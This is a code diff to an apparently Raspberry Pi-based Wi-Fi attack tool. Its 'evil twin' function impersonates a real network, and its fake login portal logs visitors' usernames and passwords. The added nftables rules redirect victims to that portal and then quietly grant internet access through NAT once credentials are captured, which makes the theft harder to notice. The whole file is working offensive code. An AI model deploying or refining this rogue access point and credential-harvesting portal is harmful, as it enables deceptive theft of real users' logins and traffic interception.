@@ -606,6 +606,9 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
         except Exception:
             user = pw = ""
         _hp_record_login(ip, user, pw)
+        # Con puente: autorizar esta IP -> deja de redirigir y se le abre el
+        # FORWARD a internet (walled garden). Sin puente es no-op.
+        _et_authorize(ip)
         self._send_html(
             "<!doctype html><html><head><meta charset='utf-8'></head>"
             "<body style='font-family:sans-serif;text-align:center;margin-top:60px;color:#222'>"
@@ -653,28 +656,57 @@ def _et_redirect_del(iface):
               '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '8080'])
 
 def _et_bridge_add(iface, uplink):
-    """Puente de internet: NAT (masquerade) de `uplink` (wlan0, con internet)
-    hacia `iface` (wlan1/honeypot) + ip_forward. Devuelve True si quedo."""
+    """Puente de internet CON portal cautivo (walled garden): NAT (masquerade)
+    de `uplink` (wlan0, con internet) hacia `iface` (wlan1/honeypot) + ip_forward.
+    El cliente resuelve DNS real (via dnsmasq), pero MIENTRAS NO este autorizado:
+      - su TCP:80 se redirige al portal (:8080) -> el movil abre el portal solo,
+      - su FORWARD a internet se bloquea (solo habla con 10.0.0.1).
+    Tras el login, `_et_authorize(ip)` mete la IP en el set @authorized: deja de
+    redirigir y se le abre internet. Devuelve True si quedo. Solo nft (trixie)."""
     _run(['sudo', '/usr/sbin/sysctl', '-w', 'net.ipv4.ip_forward=1'])
     nft = _nft()
     if nft:
         _run(['sudo', nft, 'add', 'table', 'ip', 'piscan_nat'])
+        # Set dinamico de IPs autorizadas (las que ya pasaron por el portal).
+        _run(['sudo', nft, 'add', 'set', 'ip', 'piscan_nat', 'authorized',
+              '{ type ipv4_addr ; }'])
+        # NAT salida a internet.
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'post',
               '{ type nat hook postrouting priority 100 ; }'])
         r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'post',
                   'oifname', uplink, 'masquerade'])
-        # Forward accept (por si hay una politica FORWARD drop por defecto):
-        # prioridad -1 para correr ANTES de un posible drop en el hook forward.
+        # NAT prerouting: autorizados pasan de largo; el resto -> portal :8080.
+        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'pre',
+              '{ type nat hook prerouting priority -100 ; }'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'pre', 'iifname', iface,
+              'ip', 'saddr', '@authorized', 'tcp', 'dport', '80', 'return'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'pre', 'iifname', iface,
+              'tcp', 'dport', '80', 'redirect', 'to', ':8080'])
+        # FORWARD: autorizados salen; retorno a clientes OK; no-autorizados se
+        # cortan (solo hablan con 10.0.0.1 = INPUT, no FORWARD: DNS/portal siguen).
         _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'fwd',
               '{ type filter hook forward priority -1 ; }'])
-        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface, 'accept'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface,
+              'ip', 'saddr', '@authorized', 'accept'])
         _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'oifname', iface, 'accept'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface, 'drop'])
         return r is not None and r.returncode == 0
+    # Fallback iptables: puente plano (internet, SIN portal cautivo forzado).
     ipt = _ipt()
     if ipt:
         r = _run(['sudo', ipt, '-t', 'nat', '-A', 'POSTROUTING', '-o', uplink, '-j', 'MASQUERADE'])
         return r is not None and r.returncode == 0
     return False
+
+def _et_authorize(ip):
+    """Marca una IP como autorizada (ya paso por el portal): la saca del redirect
+    y le abre el FORWARD a internet. Solo aplica en modo puente (nft)."""
+    if not ip or not _ET_STATE.get("bridge"):
+        return
+    nft = _nft()
+    if nft:
+        _run(['sudo', nft, 'add', 'element', 'ip', 'piscan_nat', 'authorized',
+              '{ %s }' % ip])
 
 def _et_bridge_del(iface, uplink):
     nft = _nft()
@@ -752,6 +784,7 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
 
     _ET_STATE["ssid"] = ssid
     _ET_STATE["portal"] = _config_get("honeypot_portal", None)
+    _ET_STATE["bridge"] = bridge   # lo consulta _et_authorize() desde el portal
     with _HP_LOCK:
         _HP.clear()
 
@@ -820,7 +853,9 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         if procs[-1].poll() is not None:
             log("dnsmasq murio (conflicto de puerto 53/67?)")
 
-        # Sin puente: forzar el portal (redirect :80). Con puente dejamos navegar.
+        # Sin puente: forzar el portal con redirect :80 (DNS wildcard, sin
+        # internet). Con puente el redirect por-cliente ya lo monto _et_bridge_add
+        # (walled garden) y se levanta solo hasta que el cliente pasa el portal.
         if not bridge:
             log(f"redirect 80->8080 via: {_et_redirect_add(iface)}")
 
